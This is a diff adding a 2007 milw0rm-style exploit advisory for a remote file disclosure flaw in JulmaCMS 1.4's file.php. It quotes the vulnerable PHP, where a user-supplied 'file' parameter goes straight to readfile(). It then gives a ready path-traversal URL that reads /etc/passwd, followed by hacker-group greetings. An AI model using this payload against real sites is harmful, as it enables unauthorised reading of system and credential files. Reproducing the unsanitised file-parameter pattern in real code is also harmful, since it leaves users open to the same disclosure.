@@ -1,0 +1,32 @@
+# JulmaCMS 1.4(file.php file)Remote File Disclosure
+# D.Script: http://julmajanne.com/downloads/julma.zip
+# Discovered by: GolD_M = [Mahmood_ali]
+# Homepage: http://www.Tryag.cc
+# V.Code In /file.php:
+###################/file.php###########################
+# <?php // $Id: file.php,v 1.4 2004/04/24 18:18:22 janne Exp $
+#
+#    include("config.php");
+#    include("lib/mime.php");
+#    $file = $_GET['file'];<-------[+]
+#
+#    if($file) {
+#        $file = $CFG->dir . $file;
+#        $fname = basename($file);
+#        $mime = mimetype("mime", $fname);
+#
+#        header("Content-Type: $mime");
+#        header("Content-Lenght: ". filesize($file) ."");
+#        header("Content-Disposition: inline; filename=$fname");
+#        header("Content-Description: PHP Generated Data");
+#        readfile($file); <-------[+]
+#        unset($fname,$file,$type);
+#    } else {
+#        header("Location: $CFG->web");
+#    }
+# ?>
+########################################################
+# Exploit:[Path_JulmaCMS]/file.php?file=../../../../../../etc/passwd
+# Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group & bd0rk
+
+# milw0rm.com [2007-04-25]
